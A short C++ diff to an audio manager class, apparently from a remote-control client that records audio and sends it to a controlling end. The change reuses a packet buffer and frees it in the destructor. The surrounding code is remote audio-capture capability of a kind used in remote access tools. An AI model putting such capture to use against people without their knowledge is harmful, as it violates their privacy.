@@ -31,6 +31,7 @@ CAudioManager::CAudioManager(IOCPClient* ClientObject, int n):CManager(ClientObj
 	m_ClientObject->OnServerSending((char*)&bToken, 1);  
 
 	WaitForDialogOpen();    //等待对话框打开
+	szPacket = NULL;
 
 	m_hWorkThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread,
 		(LPVOID)this, 0, NULL);
@@ -77,7 +78,7 @@ BOOL CAudioManager::SendRecordBuffer()
 	if (szBuffer == NULL)
 		return 0;
 	//分配缓冲区
-	LPBYTE	szPacket = new BYTE[dwBufferSize + 1];
+	szPacket = szPacket ? szPacket : new BYTE[dwBufferSize + 1];
 	//加入数据头
 	szPacket[0] = TOKEN_AUDIO_DATA;     //向主控端发送该消息
 	//复制缓冲区
@@ -87,7 +88,6 @@ BOOL CAudioManager::SendRecordBuffer()
 	{
 		dwReturn = m_ClientObject->OnServerSending((char*)szPacket, dwBufferSize + 1);  	
 	}
-	delete	szPacket;   
 	return dwReturn;	
 }
 
@@ -102,6 +102,11 @@ CAudioManager::~CAudioManager()
 	{
 		delete m_AudioObject;
 		m_AudioObject = NULL;
+	}
+	if (szPacket)
+	{
+		delete [] szPacket;
+		szPacket = NULL;
 	}
 	printf("~CAudioManager %x\n", this);
 }
